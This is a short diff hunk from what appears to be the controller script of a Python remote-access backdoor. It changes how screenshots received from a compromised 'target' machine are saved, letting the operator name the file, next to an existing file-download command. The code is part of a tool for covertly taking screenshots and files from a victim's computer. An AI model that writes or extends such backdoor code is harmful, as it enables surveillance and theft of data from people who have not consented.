@@ -77,7 +77,10 @@ try:
                 download_file(command[9:])
 
             elif command[:10] == "screenshot":
-                f = open('scrennshot%d.png' % (count), 'wb')
+                if command == "screenshot":
+                    f = open('scrennshot%d.png' % (count), 'wb')
+                else:
+                    f = open(f"{command[11:]}.png", 'wb')
                 target.settimeout(3)
                 chunk = target.recv(1024)
                 while chunk:
